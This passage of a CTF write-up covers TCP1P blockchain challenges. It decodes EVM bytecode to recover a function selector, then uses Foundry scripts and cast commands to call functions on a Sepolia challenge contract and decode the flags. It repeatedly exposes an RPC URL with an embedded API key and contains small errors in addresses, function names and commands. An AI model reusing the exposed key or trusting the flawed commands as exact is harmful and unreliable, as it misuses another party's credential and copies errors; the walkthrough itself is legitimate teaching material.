17925050509392505050565b6000819050919050565b6000819050919050565b6000620003646200035e62000358846200032f565b62000339565b6200032f565b9050919050565b6000819050919050565b620003808362000343565b620003986200038f826200036b565b848454620002d9565b825550505050565b600090565b620003af620003a0565b620003bc81848462000375565b505050565b5b81811015620003e457620003d8600082620003a5565b600181019050620003c2565b5050565b601f8211156200043357620003fd81620002a7565b6200040884620002bc565b8101602085101562000418578190505b620004306200042785620002bc565b830182620003c1565b50505b505050565b600082821c905092915050565b6000620004586000198460080262000438565b1980831691505092915050565b600062000473838362000445565b9150826002028217905092915050565b6200048e8262000209565b67ffffffffffffffff811115620004aa57620004a962000214565b5b620004b6825462000272565b620004c3828285620003e8565b600060209050601f831160018114620004fb5760008415620004e6578287015190505b620004f2858262000465565b86555062000562565b601f1984166200050b86620002a7565b60005b8281101562000535578489015182556001820191506020850194506020810190506200050e565b8683101562000555578489015162000551601f89168262000445565b8355505b6001600288020188555050505b505050505050565b6106f1806200057a6000396000f3fe608060405234801561001057600080fd5b50600436106100b45760003560e01c8063937cc96711610071578063937cc96714610145578063b00d78a51461014f578063b8d6426714610159578063c3ea113614610177578063dcbc088514610195578063dd7f7b4b1461019f576100b4565b8063236ff8ab146100b9578063346dbadd146100d75780633d8a63e4146100f55780634adfcb1314610113578063795abd871461011d57806392dca47614610127575b600080fd5b6100c16101bd565b6040516100ce9190610639565b60405180910390f35b6100df61024b565b6040516100ec9190610639565b60405180910390f35b6100fd6102d9565b60405161010a9190610639565b60405180910390f35b61011b610367565b005b610125610369565b005b61012f61036b565b60405161013c9190610639565b60405180910390f35b61014d6103f9565b005b6101576103fb565b005b6101616103fd565b60405161016e9190610639565b60405180910390f35b61017f61048b565b60405161018c9190610639565b60405180910390f35b61019d610519565b005b6101a761051b565b6040516101b49190610639565b60405180910390f35b600480546101ca9061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546101f69061068a565b80156102435780601f1061021857610100808354040283529160200191610243565b820191906000526020600020905b81548152906001019060200180831161022657829003601f168201915b505050505081565b600680546102589061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546102849061068a565b80156102d15780601f106102a6576101008083540402835291602001916102d1565b820191906000526020600020905b8154815290600101906020018083116102b457829003601f168201915b505050505081565b600380546102e69061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546103129061068a565b801561035f5780601f106103345761010080835404028352916020019161035f565b820191906000526020600020905b81548152906001019060200180831161034257829003601f168201915b505050505081565b565b565b600580546103789061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546103a49061068a565b80156103f15780601f106103c6576101008083540402835291602001916103f1565b820191906000526020600020905b8154815290600101906020018083116103d457829003601f168201915b505050505081565b565b565b6000805461040a9061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546104369061068a565b80156104835780601f1061045857610100808354040283529160200191610483565b820191906000526020600020905b81548152906001019060200180831161046657829003601f168201915b505050505081565b600180546104989061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546104c49061068a565b80156105115780601f106104e657610100808354040283529160200191610511565b820191906000526020600020905b8154815290600101906020018083116104f457829003601f168201915b505050505081565b565b600280546105289061068a565b80601f01602080910402602001604051908101604052809291908181526020018280546105549061068a565b80156105a15780601f10610576576101008083540402835291602001916105a1565b820191906000526020600020905b81548152906001019060200180831161058457829003601f168201915b505050505081565b600081519050919050565b600082825260208201905092915050565b60005b838110156105e35780820151818401526020810190506105c8565b60008484015250505050565b6000601f19601f8301169050919050565b600061060b826105a9565b61061581856105b4565b93506106258185602086016105c5565b61062e816105ef565b840191505092915050565b600060208201905081810360008301526106538184610600565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806106a257607f821691505b6020821081036106b5576106b461065b565b5b5091905056fea2646970667358221220746841f27e5037f89c15c7d04d5c1102b534a6fc0a7d4297aaa71c7392bedfd164736f6c63430008120033
+</code></pre></div></div>
+
+<p>Okay, We have enough Information from <code class="language-plaintext highlighter-rouge">101.txt</code>. And we are given a EVM bytecode of the contract in <code class="language-plaintext highlighter-rouge">Invitation.txt</code></p>
+
+<p>Our Goal :</p>
+
+<ul>
+  <li>Get the function name which starts with <code class="language-plaintext highlighter-rouge">TCP1P</code></li>
+</ul>
+
+<p>Observations :</p>
+
+<ul>
+  <li>We have only the bytecode of the challenge</li>
+</ul>
+
+<blockquote>
+  <p><strong>What can we do? Can we decompile bytecode into readable solidity contract?</strong></p>
+</blockquote>
+
+<p>Yes, We can get <code class="language-plaintext highlighter-rouge">OP codes</code> and somewhat readable contract by using some decompiling tools. Here is the list of few EVM bytecode Decompilers</p>
+
+<ul>
+  <li><a href="https://library.dedaub.com/" target="_blank">Dedaub</a></li>
+  <li><a href="https://ethervm.io/decompile" target="_blank">EtherVM</a></li>
+  <li><a href="https://github.com/palkeo/panoramix" target="_blank">Panoramix</a></li>
+  <li><a href="https://github.com/Jon-Becker/heimdall-rs" target="_blank">Heimdall</a></li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">Dedaub</code> is many folks favourite and free to use. So, we can decompile our bytecode using Dedaub online decompiler.</p>
+
+<blockquote>
+  <p><strong><code class="language-plaintext highlighter-rouge">Before decompiling lets see how function names stores in bytecode</code></strong></p>
+</blockquote>
+
+<p>Function names won’t be directly stores as it is in the bytecode. Only function selector of that particular function will be stored in bytecode.</p>
+
+<p><span style="color: green"><strong>What is function selector?</strong></span></p>
+
+<p>A function selector is a four-byte identifier determined through the Keccak256 hash of the function’s signature. The function signature is derived from the function name and the parenthesized list of parameter types. For example a function is defined as below :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">sum</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">b</span><span class="p">)</span> <span class="kr">public</span> <span class="nf">returns</span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
+    <span class="c1">//....</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Function signature of sum() is <code class="language-plaintext highlighter-rouge">sum(uint,uint)</code>.</p>
+
+<p>Function selector of sum() is <code class="language-plaintext highlighter-rouge">bytes4(keccak256(bytes("sum(uint,uint)")))</code></p>
+
+<p>We can get the function selector using <code class="language-plaintext highlighter-rouge">cast</code> cli tool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/invitation<span class="nv">$ </span>cast sig <span class="s2">"sum(uint,uint)"</span>
+0xcad0899b
+</code></pre></div></div>
+
+<p>As you can see only 4 bytes hex value is the function signature. This 4 bytes value only stored in the EVM bytecode.</p>
+
+<p><span style="color: green"><strong>Which OP code operates this function signature?</strong></span></p>
+
+<p>It is <code class="language-plaintext highlighter-rouge">PUSH4</code> as PUSH4 OP code used to push 4 bytes at a time into the stack. For the above example, the assembly will be <strong><code class="language-plaintext highlighter-rouge">PUSH 0xcad0899b</code></strong>.</p>
+
+<blockquote>
+  <p>We have got enough knowledge know lets solve the challenge</p>
+</blockquote>
+
+<p><span style="color: green"><strong>Decompile the EVM bytecode and find the function selector</strong></span></p>
+
+<p>I am using <code class="language-plaintext highlighter-rouge">Dedaub</code> to decompile. Enter the Bytecode in online decompiler and continue to decompile the EVM bytecode and view the disassembled section for the OP Codes. Our aim is to find the function selector which is operated by <code class="language-plaintext highlighter-rouge">PUSH4</code> OP Code, so lets find PUSH4 in the OP Codes.As you can see in below image we found few function selectors.</p>
+
+<p><img src="/assets/img/post_img/tcp1pctf23_invitation1.png" class="autoimg" /></p>
+
+<blockquote>
+  <p><strong>Can we get back the original function name from function selector?</strong></p>
+</blockquote>
+
+<p>Absolutely not, it is impossible to get the original function signature information back theatrically. But there is a way to find it. There is a database available which collects tons of function signatures and their hashes.</p>
+
+<ul>
+  <li><a href="https://www.4byte.directory/" target="_blank">4byte.directory</a></li>
+</ul>
+
+<p>Search one by one function selectors that we found from the decompilation. <code class="language-plaintext highlighter-rouge">0xb00d78a5</code> is the one that we are looking.</p>
+
+<p><img src="/assets/img/post_img/tcp1pctf23_invitation2.png" class="autoimg" /></p>
+
+<p>Finally change the function name to flag format as specified in the 101.txt</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : TCP1P{4_Bytes_SigNAtuRe_aS_4n_Invitation_congratz}</code></p>
+</blockquote>
+
+<h1 id="vip">VIP</h1>
+
+<p><strong>Description :</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A very simple system at a party. If you are a VIP, you can get everything.
+
+Challenge : nc ctf.tcp1p.com 23345
+</code></pre></div></div>
+
+<p>Lets connect to challenge,</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@AHLinux:~/vip<span class="nv">$ </span>nc ctf.tcp1p.com 23345
+Welcome to TCP1P Blockchain Challenge
+
+1. How to 101?
+2. get Contract
+<span class="o">&gt;&gt;</span> 1
+Same as the last challenge, but this <span class="nb">time</span>, call the <span class="nb">help</span><span class="o">()</span> <span class="k">function </span>first
+
+mj0ln1r@AHLinux:~/vip<span class="nv">$ </span>nc ctf.tcp1p.com 23345
+Welcome to TCP1P Blockchain Challenge
+
+1. How to 101?
+2. get Contract
+<span class="o">&gt;&gt;</span> 2
+Contract Addess: 0xCf2C346b07CE9931962fC8B6d93fF094FbF447B9
+RPC URL        : https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+To start       : Simply call the <span class="nb">help</span><span class="o">()</span> <span class="k">function</span>, everything is written there
+
+Note: Due it<span class="s1">'s deployed on Sepolia network, please use your own Private key to do the transaction
+      If you need funds, you can either DM the probset or get it on https://sepoliafaucet.com/
+</span></code></pre></div></div>
+
+<p>Firstly get some Sepolia ETH if you dont have like me. Thank you <strong>@kiinzu(author)</strong> for the Sepolia ETH :-).</p>
+
+<p>Initially I did this challenge by writing a contract on remix and called challenge contract from there. Now I will explain a much more easy way using <code class="language-plaintext highlighter-rouge">Foundry</code>.</p>
+
+<p><strong>Setup Foundry</strong></p>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">forge init</code> (to setup foundry project)</li>
+  <li>Delete boiler plate codes under (/src, /test, /script)</li>
+  <li>Create a new file <code class="language-plaintext highlighter-rouge">Solve.s.sol</code> in <code class="language-plaintext highlighter-rouge">/script</code></li>
+  <li>Import Script and console to write scripts and logging.</li>
+</ol>
+
+<p>First of all as challenge 101 said, call the <code class="language-plaintext highlighter-rouge">help()</code> function. I used <code class="language-plaintext highlighter-rouge">call</code> method to call the help() function and decoded using <code class="language-plaintext highlighter-rouge">abi.decode</code>.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="c1">// import "forge-std/Script.sol";</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">SolveVIP</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">getHelp</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_help</span><span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">help()</span><span class="dl">"</span><span class="p">));</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="nx">_help</span><span class="p">,</span> <span class="p">(</span><span class="nx">bytes</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">getHelp</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If we run the script and decoded the output we will get some message to move forward in challenge.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/vip<span class="nv">$ </span>forge script script/Solve.s.sol <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+<span class="o">[</span>⠢] Compiling...
+<span class="o">[</span>⠒] Compiling 15 files with 0.8.20
+<span class="o">[</span>⠢] Solc 0.8.20 finished <span class="k">in </span>5.83s
+Compiler run successful!
+Script ran successfully.
+
+<span class="o">==</span> Logs <span class="o">==</span>
+  0x57656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a
+
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>python3
+<span class="o">&gt;&gt;&gt;</span> from Crypto.Util.number import long_to_bytes
+<span class="o">&gt;&gt;&gt;</span> long_to_bytes<span class="o">(</span>0x57656c636f6d6520746f205443503150205072697661746520436c7562210a0a456e6a6f792074686520435446205061727479206f6620796f7572206c6966652068657265210a4275742066697273742e2e2e20506c656173652067697665206d6520796f75722069642c206e6f726d616c2070656f706c652068617665206174206c65617374206d656d62657220726f6c650a4f6620436f757273652c2074686572652061726520616c736f206d616e792056495073206f76657220686572652e20422d290a0a46756e6374696f6e733a0a0a456e7472616e636528726f6c6529202d3e2076657269667920796f757220726f6c6520686572652c2061726520796f752061206d656d626572206f722056495020436c6173730a2020203e20726f6c6520202d2d3e20696e70757420796f757220726f6c6520617320737472696e670a737465616c564950436f64652829202d3e20736f6d656f6e65206d69676874277665206a75737420737465616c20612076697020636f646520616e642077616e7420746f206769766520697420746f20796f750a676574466c616728292020202020202d3e204f6e636520796f752073686f7720796f757220726f6c652c20796f752063616e2074727920796f7572206c75636b21204f4e4c59205649502043616e206765742074686520466c6167210a0a0a<span class="o">)</span>
+
+b<span class="s2">"Welcome to TCP1P Private Club!
+
+Enjoy the CTF Party of your life here!
+But first... Please give me your id, normal people have at least member role
+Of Course, there are also many VIPs over here. B-)
+Functions:
+Entrance(role) -&gt; verify your role here, are you a member or VIP Class
+   &gt; role  --&gt; input your role as string
+   stealVIPCode() -&gt; someone might've just steal a vip code and want to give it to you
+   getFlag()      -&gt; Once you show your role, you can try your luck! ONLY VIP Can get the Flag!"</span>
+
+</code></pre></div></div>
+
+<p>Now we its clear that we need to call <code class="language-plaintext highlighter-rouge">stealVIPCode()</code> first then get the VIP Code and use it to call the <code class="language-plaintext highlighter-rouge">Entrance(role)</code> to solve the challenge. Finally calling the <code class="language-plaintext highlighter-rouge">getFlag()</code> will give us the flag.</p>
+
+<p>Lets call <code class="language-plaintext highlighter-rouge">stealVIPCode()</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="c1">// import "forge-std/Script.sol";</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">SolveVIP</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">callStealVIPCode</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+            <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+            <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_vipCode</span><span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">stealVIPCode()</span><span class="dl">"</span><span class="p">));</span>
+            <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="nx">_vipCode</span><span class="p">,(</span><span class="nx">bytes</span><span class="p">)));</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nf">callStealVIPCode</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Run Script and Decode the hex to get the VIPCode.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/vip<span class="nv">$ </span>forge script script/Solve.s.sol <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+<span class="o">[</span>⠢] Compiling...
+<span class="o">[</span>⠒] Compiling 15 files with 0.10.20
+<span class="o">[</span>⠢] Solc 0.8.20 finished <span class="k">in </span>5.35s
+Compiler run successful!
+Script ran successfully.
+
+<span class="o">==</span> Logs <span class="o">==</span>
+  0x2049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743a203078303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303032303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030326635343433353033313530333137333734343336633631373337333533363536313734323032643230363937333230373436383635323035363439353032303534363936333662363537343230373436383635373932303733363136393634303030303030303030303030303030303030303030303030303030303030303030300a
+
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>python3
+<span class="o">&gt;&gt;&gt;</span> from Crypto.Util.number import long_to_bytes
+<span class="o">&gt;&gt;&gt;</span> long_to_bytes<span class="o">(</span>0x2049206d6179206f72206d6179206e6f742067657420796f752061207469636b65742c20627574204920646f6e277420756e6465727374616e64206d7563682061626f757420686f7720746f206465636f646520746869732e0a4974277320736f6d6520736f7274206f6620746865697220616269436f64657220706f6c6963792e200a5649502d5469636b65743a203078303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303032303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303030326635343433353033313530333137333734343336633631373337333533363536313734323032643230363937333230373436383635323035363439353032303534363936333662363537343230373436383635373932303733363136393634303030303030303030303030303030303030303030303030303030303030303030300a<span class="o">)</span>
+
+b<span class="s2">" I may or may not get you a ticket, but I don't understand much about how to decode this.</span><span class="se">\n</span><span class="s2">It's some sort of their abiCoder policy. </span><span class="se">\n</span><span class="s2">VIP-Ticket: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002f5443503150317374436c61737353656174202d2069732074686520564950205469636b6574207468657920736169640000000000000000000000000000000000</span><span class="se">\n</span><span class="s2">"</span>
+
+<span class="o">&gt;&gt;&gt;</span> long_to_bytes<span class="o">(</span>0x5443503150317374436c61737353656174202d2069732074686520564950205469636b657420746865792073616964<span class="o">)</span>
+b<span class="s1">'TCP1P1stClassSeat - is the VIP Ticket they said'</span>
+
+</code></pre></div></div>
+
+<p>Now we have got VIPCode lets call <code class="language-plaintext highlighter-rouge">Entrance(role)</code> with role as <strong><code class="language-plaintext highlighter-rouge">TCP1P1stClassSeat</code></strong> and call <code class="language-plaintext highlighter-rouge">getCall()</code> to get flag hex and decode it for the flag.</p>
+
+<blockquote>
+  <p>The final script  :</p>
+</blockquote>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">SolveVIP</span> <span class="nx">is</span> <span class="nx">Script</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">getHelp</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_help</span><span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">help()</span><span class="dl">"</span><span class="p">));</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+        <span class="c1">// console.logBytes(abi.decode(_help, (bytes)));</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">callStealVIPCode</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_vipCode</span><span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">stealVIPCode()</span><span class="dl">"</span><span class="p">));</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+        <span class="c1">// console.logBytes(abi.decode(_vipCode,(bytes)));</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">callEntrance</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">_role</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">Entrance(string)</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_role</span><span class="p">));</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">callGetFlag</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">address</span> <span class="nx">target</span> <span class="o">=</span> <span class="mh">0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">bool</span> <span class="nx">success</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">memory</span> <span class="nx">_flag</span><span class="p">)</span> <span class="o">=</span> <span class="nx">target</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encodeWithSignature</span><span class="p">(</span><span class="dl">"</span><span class="s2">getFlag()</span><span class="dl">"</span><span class="p">));</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">success</span><span class="p">);</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes</span><span class="p">(</span><span class="nx">_flag</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="c1">// getHelp();</span>
+        <span class="c1">// callStealVIPCode();</span>
+        <span class="nf">callEntrance</span><span class="p">(</span><span class="dl">"</span><span class="s2">TCP1P1stClassSeat</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nf">callGetFlag</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/vip<span class="nv">$ </span>forge script script/Solve.s.sol <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 <span class="nt">--private-key</span> &lt;REDACTED&gt; 
+<span class="o">[</span>⠢] Compiling...
+<span class="o">[</span>⠒] Compiling 15 files with 0.10.20
+<span class="o">[</span>⠢] Solc 0.8.20 finished <span class="k">in </span>10.35s
+Compiler run successful!
+Script ran successfully.
+
+<span class="o">==</span> Logs <span class="o">==</span>
+  0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003854435031507b345f6231745f6f665f6630756e6472795f73336e645f346e645f616269436f6465725f77306e375f687572375f793334687d0000000000000000
+
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>python3
+<span class="o">&gt;&gt;&gt;</span> from Crypto.Util.number import long_to_bytes
+<span class="o">&gt;&gt;&gt;</span> long_to_bytes<span class="o">(</span>0x54435031507b345f6231745f6f665f6630756e6472795f73336e645f346e645f616269436f6465725f77306e375f687572375f793334687d<span class="o">)</span>
+b<span class="s1">'TCP1P{4_b1t_of_f0undry_s3nd_4nd_abiCoder_w0n7_hur7_y34h}'</span>
+
+</code></pre></div></div>
+
+<h3 id="quick-way-to-solve">Quick way to Solve</h3>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">cast</code> cli tool to call the function from command line quickly.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:~/vip<span class="nv">$ </span>cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637  <span class="s2">"help()"</span> <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 <span class="s2">"stealVIPCode()"</span> <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>cast send 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 <span class="s2">"getEntrance(string)"</span> <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8 <span class="nt">--private-key</span> &lt;REDACTED&gt; <span class="nt">--</span> <span class="s2">"TCP1P1stClassSeat"</span>
+mj0ln1r@Linux:~/vip<span class="nv">$ </span>cast 0x52DF9c7cc8f8f5C8204F2401505A6248cE49d637 <span class="s2">"getFlag()"</span> <span class="nt">--rpc-url</span> https://eth-sepolia.g.alchemy.com/v2/SMfUKiFXRNaIsjRSccFuYCq8Q3QJgks8
+</code></pre></div></div>
+
+<p>And dont forget to decoding each output in the same way we did before to get the flag.</p>
+
+<hr />
+
